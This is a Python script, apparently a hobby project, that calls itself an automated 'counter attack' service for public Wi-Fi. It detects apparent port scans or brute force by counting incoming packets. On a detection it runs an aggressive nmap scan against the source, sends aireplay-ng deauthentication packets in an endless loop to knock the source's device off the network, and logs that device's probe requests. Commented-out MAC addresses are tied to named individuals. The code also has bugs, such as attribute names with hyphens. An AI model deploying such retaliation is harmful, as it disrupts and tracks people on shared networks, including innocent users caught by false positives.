import argparse
import netifaces
from scapy.all import *
import socket
import subprocess
import sys
import threading

class Protecc:

    def __init__(self, internet, monitor, sniffTime, whitelist):
        self.internet = internet
        self.monitor = monitor
        self.sniffTime = sniffTime
        # IP -> port -> freq
        self.incomingIPs = {}
        self.blacklist = set()

    def receivePacket(self, pkt):
        if IP in pkt:
            if pkt[IP].dst == self.getInterfaceIP(self.internet):
                srcIP = pkt[IP].src
                srcMAC = pkt[Ether].src
                dstPort = pkt[TCP].dport
                if srcIP not in self.incomingIPs:
                    self.incomingIPs[srcIP] = {}
                    self.incomingIPs[srcIP][dstPort] = 1
                else:
                    if dstPort not in self.incomingIPs[srcIP]:
                        self.incomingIPs[srcIP][dstPort] = 0
                    self.incomingIPs[srcIP][dstPort] += 1

                if srcIP not in self.blacklist:
                    if len(self.incomingIPs[srcIP]) > 100:
                        print("potential nmap scan from " + srcIP + " (" + srcMAC + "); counterattacking")
                        self.blacklist.add(srcIP)
                        self.defend(srcMAC, srcIP)
                    if self.incomingIPs[srcIP][dstPort] > 100:
                        print("brute force detected from " + srcIP + " (" + srcMAC + "); counterattacking")
                        self.blacklist.add(srcIP)
                        self.defend(srcMAC, srcIP)

    def defend(self, attackerMAC, attackerIP):
        # macAddress = "ac:37:43:a3:fd:6f" # eric phone
        # macAddress = "10:08:b1:6f:ef:bb" # robert
        # macAddress = "b8:e8:56:44:59:c4" # maurya

        self.setMonitorMode()
        routerMAC = self.findRouterMAC()
        self.logNmap(attackerIP)
        thread = threading.Thread(target=self.spamDeauthPackets, args=[1, routerMAC, attackerMAC, self.monitor])
        thread.start()
        self.sniffProbeRequests(attackerMAC, self.sniffTime)

    def getInterfaceIP(self, interface):
        return netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['addr']

    def setMonitorMode(self):
        subprocess.run(["ifconfig", self.monitor, "down"])
        subprocess.run(["iwconfig", self.monitor, "mode", "monitor"])
        subprocess.run(["ifconfig", self.monitor, "up"])

    def findRouterMAC(self):
        out = subprocess.check_output("ip route | grep default", shell=True)
        ip = out.split()[2].decode('utf-8')
        mac = subprocess.check_output("arp -a | grep '(" + str(ip) + ")'", shell=True)
        return mac.split()[3].decode('utf-8')

    def spamDeauthPackets(self, count, routerMAC, attackerMAC, interface):
        while True:
            subprocess.run(["aireplay-ng", "-0", str(count), "-a", routerMAC, "-c", attackerMAC, interface])

    def logNmap(self, ip):
        subprocess.run(["nmap", "-A", "-oN", "nmap-" + ip + ".log", ip])

    def sniffProbeRequests(self, macAddress, sniffTime):
        subprocess.run("timeout " + str(sniffTime) + "s " \
                       "python probemon.py -i " + self.monitor + " -o sneaks.log -t unix -fsrl | " \
                       "grep --line-buffered " + macAddress + " > probeRequests.log", shell=True)

DESCRIPTION = "Automated counter attack service for public wifi"

def doSniff(interface, protecc):
    sniff(iface=interface, prn=protecc.receivePacket)

def main():
    parser = argparse.ArgumentParser(description=DESCRIPTION)
    parser.add_argument("-i", "--internet-interface", help="internet interface")
    parser.add_argument("-m", "--monitoring-interface", help="sniff + deauth interface")
    parser.add_argument("-o", "--output", help="result output location")
    parser.add_argument("-s", "--sniffTime", help="how long to sniff for probe requests")
    parser.add_argument("-w", "--whitelist", help="MAC address whitelist (newline separated)")
    args = parser.parse_args()

    if not args.internet-interface:
        print("ERROR: pls provide internet interface")
        sys.exit(-1)

    if not args.monitoring-interface:
        print("ERROR: pls provide monitor supported interface")
        sys.exit(-1)

    p = Protecc(args.internet_interface, args.monitoring_interface, args.sniffTime, args.whitelist)

    thread = threading.Thread(target=doSniff, args=[args.internet_interface, p])
    thread.start()


if __name__ == "__main__":
    main()
